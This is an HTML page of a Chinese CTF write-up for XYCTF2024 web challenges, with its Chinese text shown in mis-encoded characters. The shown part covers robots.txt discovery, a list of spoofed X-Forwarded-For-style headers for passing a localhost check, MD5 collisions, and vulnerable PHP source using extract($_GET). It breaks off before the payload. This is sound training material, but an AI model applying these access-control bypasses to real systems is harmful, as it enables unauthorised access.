<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="å‰è¨€ å¤šåšç‚¹é¢˜ã€‚æ€»è§‰å¾—è‡ªå·±åšé¢˜åšä¸å‡ºæ¥ï¼Œè¿˜æ˜¯è¦å¤šå†™ä¸€ç‚¹ã€‚ ezhttp çŸ¥è¯†ç‚¹ï¼šhttpã€robots.txt æºä»£ç é‡Œæç¤ºå¯†ç æ”¾åœ¨äº†æŸä¸ªåœ°æ–¹ï¼Œç›´è§‰æ˜¯robo">
<title>XYCTF2024</title>

<link rel='canonical' href='http://localhost:1313/p/xyctf2024/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="XYCTF2024">
<meta property='og:description' content="å‰è¨€ å¤šåšç‚¹é¢˜ã€‚æ€»è§‰å¾—è‡ªå·±åšé¢˜åšä¸å‡ºæ¥ï¼Œè¿˜æ˜¯è¦å¤šå†™ä¸€ç‚¹ã€‚ ezhttp çŸ¥è¯†ç‚¹ï¼šhttpã€robots.txt æºä»£ç é‡Œæç¤ºå¯†ç æ”¾åœ¨äº†æŸä¸ªåœ°æ–¹ï¼Œç›´è§‰æ˜¯robo">
<meta property='og:url' content='http://localhost:1313/p/xyctf2024/'>
<meta property='og:site_name' content='liernian'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-07-29T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-07-29T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="XYCTF2024">
<meta name="twitter:description" content="å‰è¨€ å¤šåšç‚¹é¢˜ã€‚æ€»è§‰å¾—è‡ªå·±åšé¢˜åšä¸å‡ºæ¥ï¼Œè¿˜æ˜¯è¦å¤šå†™ä¸€ç‚¹ã€‚ ezhttp çŸ¥è¯†ç‚¹ï¼šhttpã€robots.txt æºä»£ç é‡Œæç¤ºå¯†ç æ”¾åœ¨äº†æŸä¸ªåœ°æ–¹ï¼Œç›´è§‰æ˜¯robo">
    <link rel="shortcut icon" href="/favicon.ico" />

  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ’¯</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">liernian</a></h1>
            <h2 class="site-description">ç†æƒ³ä¸»ä¹‰çš„ä¸­äºŒå°‘å¹´</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>é“¾æ¥</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="http://localhost:1313/en/" >English</option>
                                
                                    <option value="http://localhost:1313/" selected>ç®€ä½“ä¸­æ–‡</option>
                                
                                    <option value="http://localhost:1313/ar/" >Ø¹Ø±Ø¨ÙŠ</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#å‰è¨€">å‰è¨€</a></li>
    <li><a href="#ezhttp">ezhttp</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹httprobotstxt">çŸ¥è¯†ç‚¹ï¼šhttpã€robots.txt</a></li>
      </ol>
    </li>
    <li><a href="#ezmd5">ezmd5</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹md5ç¢°æ’">çŸ¥è¯†ç‚¹ï¼šmd5ç¢°æ’</a></li>
      </ol>
    </li>
    <li><a href="#warm-up">Warm up</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹md5ç»•è¿‡">çŸ¥è¯†ç‚¹ï¼šmd5ç»•è¿‡</a></li>
      </ol>
    </li>
    <li><a href="#ezclass">ezClass</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹phpåŸç”Ÿç±»errorgemessagesplåŸç”Ÿç±»ä¼ªåè®®åˆ©ç”¨">çŸ¥è¯†ç‚¹ï¼šphpåŸç”Ÿç±»Errorï¼šgeMessage()ã€SplåŸç”Ÿç±»+ä¼ªåè®®åˆ©ç”¨</a></li>
      </ol>
    </li>
    <li><a href="#ezrce">ezRce</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹æ— å­—æ¯rceå…«è¿›åˆ¶0">çŸ¥è¯†ç‚¹ï¼šæ— å­—æ¯rceï¼ˆå…«è¿›åˆ¶+$0&laquo;&lt;ï¼‰</a></li>
      </ol>
    </li>
    <li><a href="#ezlfi">ezLFI</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹åˆ©ç”¨filterè¿‡æ»¤å™¨çš„ç¼–ç ç»„åˆæ„é€ rce">çŸ¥è¯†ç‚¹ï¼šåˆ©ç”¨filterè¿‡æ»¤å™¨çš„ç¼–ç ç»„åˆæ„é€ RCE</a></li>
      </ol>
    </li>
    <li><a href="#ezpop">ezPop</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹gcåƒåœ¾å›æ”¶call_user_funcabcd">çŸ¥è¯†ç‚¹ï¼šGCåƒåœ¾å›æ”¶ã€call_user_func($a,$b)($c)($d)</a></li>
      </ol>
    </li>
    <li><a href="#ezserialize">ezSerialize</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹ååºåˆ—åŒ–çŸ¥è¯†ç‚¹æ‚ç³…">çŸ¥è¯†ç‚¹ï¼šååºåˆ—åŒ–çŸ¥è¯†ç‚¹æ‚ç³…</a></li>
      </ol>
    </li>
    <li><a href="#ç‰¢ç‰¢è®°ä½é€è€…ä¸ºå¤§">ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹wageè¿œç¨‹ä¸‹è½½æœ¨é©¬ncåå¼¹shell">çŸ¥è¯†ç‚¹ï¼šwageè¿œç¨‹ä¸‹è½½æœ¨é©¬ã€ncåå¼¹shell</a></li>
      </ol>
    </li>
    <li><a href="#è¿è¿çœ‹httpssocsdnnetsosearchqè¿è¿çœ‹spm1001210130017020åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹"><a href="https://so.csdn.net/so/search?q=%E8%BF%9E%E8%BF%9E%E7%9C%8B&amp;spm=1001.2101.3001.7020">è¿è¿çœ‹</a>åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹php_filter_chainstringstrip_tagsè¿‡æ»¤php">çŸ¥è¯†ç‚¹ï¼šphp_filter_chainã€string.strip_tagsè¿‡æ»¤php</a></li>
      </ol>
    </li>
    <li><a href="#æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº">æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹è„‘æ´sstirequestattrç»•è¿‡">çŸ¥è¯†ç‚¹ï¼šè„‘æ´sstiã€request+attrç»•è¿‡</a></li>
      </ol>
    </li>
    <li><a href="#login">login</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹pickleååºåˆ—åŒ–oæŒ‡ä»¤ç ç»•è¿‡">çŸ¥è¯†ç‚¹ï¼špickleååºåˆ—åŒ–oæŒ‡ä»¤ç ç»•è¿‡</a></li>
      </ol>
    </li>
    <li><a href="#give-me-flag">give me flag</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»">çŸ¥è¯†ç‚¹ï¼šå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»</a></li>
      </ol>
    </li>
    <li><a href="#pharme">pharme</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹__halt_compilerç»ˆæ­¢ç¼–è¯‘evalendgetallheadersç»•è¿‡æ— å‚æ•°rcepharååºåˆ—åŒ–phpfilterç»•è¿‡phar">çŸ¥è¯†ç‚¹ï¼š__halt_compiler()ç»ˆæ­¢ç¼–è¯‘ã€eval(end(getallheaders()));ç»•è¿‡æ— å‚æ•°rceã€pharååºåˆ—åŒ–ã€php:filterç»•è¿‡phar</a></li>
      </ol>
    </li>
    <li><a href="#ezmake">ezMake</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹makefile">çŸ¥è¯†ç‚¹ï¼šMakefile</a></li>
      </ol>
    </li>
    <li><a href="#ezmake-1">ez?Make</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹åå¼¹shell">çŸ¥è¯†ç‚¹ï¼šåå¼¹shell</a></li>
      </ol>
    </li>
    <li><a href="#ÎµzĞ¼kÎµ">ÎµZ?Â¿Ğ¼@KÎµÂ¿?</a>
      <ol>
        <li><a href="#çŸ¥è¯†ç‚¹æ— å­—æ¯æ•°å­—makefile">çŸ¥è¯†ç‚¹ï¼šæ— å­—æ¯æ•°å­—makefile</a></li>
      </ol>
    </li>
    <li><a href="#baby_unserialize">baby_unserialize</a></li>
    <li><a href="#å°ç»“">å°ç»“</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/wp/" >
                Wp
            </a>
        
            <a href="/categories/web/" >
                Web
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/xyctf2024/">XYCTF2024</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-07-29</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 15 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="å‰è¨€">å‰è¨€
</h2><p>å¤šåšç‚¹é¢˜ã€‚æ€»è§‰å¾—è‡ªå·±åšé¢˜åšä¸å‡ºæ¥ï¼Œè¿˜æ˜¯è¦å¤šå†™ä¸€ç‚¹ã€‚</p>
<h2 id="ezhttp">ezhttp
</h2><h3 id="çŸ¥è¯†ç‚¹httprobotstxt">çŸ¥è¯†ç‚¹ï¼šhttpã€robots.txt
</h3><p>æºä»£ç é‡Œæç¤ºå¯†ç æ”¾åœ¨äº†æŸä¸ªåœ°æ–¹ï¼Œç›´è§‰æ˜¯robots.txtã€‚ç„¶åå¯ä»¥è¿›/l0g1n.txtçœ‹åˆ°è´¦å·å’Œå¯†ç </p>
<p><img src="/p/xyctf2024/image-20250729132957432.png"
	width="545"
	height="172"
	srcset="/p/xyctf2024/image-20250729132957432_hu3132556971175434162.png 480w, /p/xyctf2024/image-20250729132957432_hu12915832062395713467.png 1024w"
	loading="lazy"
	
		alt="image-20250729132957432"
	
	
		class="gallery-image" 
		data-flex-grow="316"
		data-flex-basis="760px"
	
></p>
<p>ç„¶åæ˜¯httpçš„å†…å®¹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è®°å½•ä¸€ä¸‹æœ¬åœ°è®¿é—®
</span></span><span class="line"><span class="cl">Client-IP: 127.0.0.1
</span></span><span class="line"><span class="cl">Forwarded-For: 127.0.0.1
</span></span><span class="line"><span class="cl">Forwarded: 127.0.0.1
</span></span><span class="line"><span class="cl">Forwarded-For: localhost
</span></span><span class="line"><span class="cl">X-Forwarded-For-Original:127.0.0.1
</span></span><span class="line"><span class="cl">X-Forwarded-For-Original: localhost
</span></span><span class="line"><span class="cl">X-Forwarded-For: 127.0.0.1
</span></span><span class="line"><span class="cl">X-Forwarded-For: localhost
</span></span><span class="line"><span class="cl">X-Forwarded-Server: 127.0.0.1
</span></span><span class="line"><span class="cl">X-Forwarded-Server: localhost
</span></span><span class="line"><span class="cl">X-Forwarded: 127.0.0.1
</span></span><span class="line"><span class="cl">X-Host:127.0.0.1
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xyctf2024/image-20250729134355455.png"
	width="1735"
	height="842"
	srcset="/p/xyctf2024/image-20250729134355455_hu5124518257539829828.png 480w, /p/xyctf2024/image-20250729134355455_hu9664602785374009103.png 1024w"
	loading="lazy"
	
		alt="image-20250729134355455"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="494px"
	
></p>
<h2 id="ezmd5">ezmd5
</h2><h3 id="çŸ¥è¯†ç‚¹md5ç¢°æ’">çŸ¥è¯†ç‚¹ï¼šmd5ç¢°æ’
</h3><p>ç¢°æ’ä¸¤å¼ å›¾ç‰‡</p>
<p>æœ¬æ¥åº”è¯¥ç”¨å·¥å…·ç¢°æ’ä¸€ä¸‹çš„ï¼Œç»“æœç›´æ¥æœåˆ°äº†ä¸¤å¼ å›¾ç‰‡çš„md5å€¼ç›¸åŒ</p>
<p>åŸæ–‡é“¾æ¥ï¼š<a class="link" href="https://zhangshuqiao.org/2018-02/%E5%88%B6%E9%80%A0MD5%E7%A2%B0%E6%92%9E/"  target="_blank" rel="noopener"
    >åˆ¶é€  MD5 ç¢°æ’</a></p>
<p><img src="/p/xyctf2024/image-20250729135646855.png"
	width="2140"
	height="215"
	srcset="/p/xyctf2024/image-20250729135646855_hu3625956026240780758.png 480w, /p/xyctf2024/image-20250729135646855_hu17702605237718190431.png 1024w"
	loading="lazy"
	
		alt="image-20250729135646855"
	
	
		class="gallery-image" 
		data-flex-grow="995"
		data-flex-basis="2388px"
	
></p>
<p>çœŸè¦ç¢°æ’çš„è¯ç”¨<a class="link" href="https://github.com/zhijieshi/md5collgen"  target="_blank" rel="noopener"
    >MD5COLLGEN</a>ç¢°æ’å›¾ç‰‡å°±è¡Œ</p>
<h2 id="warm-up">Warm up
</h2><h3 id="çŸ¥è¯†ç‚¹md5ç»•è¿‡">çŸ¥è¯†ç‚¹ï¼šmd5ç»•è¿‡
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;next.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$XYCTF</span> <span class="o">=</span> <span class="s2">&#34;Warm up&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val1&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val2&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val1&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val2&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;ez&#34;</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;ä»€ä¹ˆæƒ…å†µ,è¿™ä¹ˆåŸºç¡€çš„md5åšä¸æ¥&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$md5</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$md5</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$md5</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;ezez&#34;</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;ä»€ä¹ˆæƒ…å†µ,è¿™ä¹ˆåŸºç¡€çš„md5åšä¸æ¥&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$XY</span> <span class="o">==</span> <span class="nv">$XYCTF</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$XY</span> <span class="o">!=</span> <span class="s2">&#34;XYCTF_550102591&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$XY</span><span class="p">)</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;XYCTF_550102591&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$level2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;ä»€ä¹ˆæƒ…å†µ,è¿™ä¹ˆåŸºç¡€çš„md5åšä¸æ¥&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;å­¦è¿™ä¹ˆä¹…,ä¼ å‚ä¸ä¼šä¼ ?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‰é¢newstaråšäº†å·®ä¸å¤šçš„é¢˜ç›®ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯<code>extract($_GET);</code>ï¼Œå®ƒå¯ä»¥è¦†ç›–å˜é‡ç»•è¿‡<code>$XY == $XYCTF</code></p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
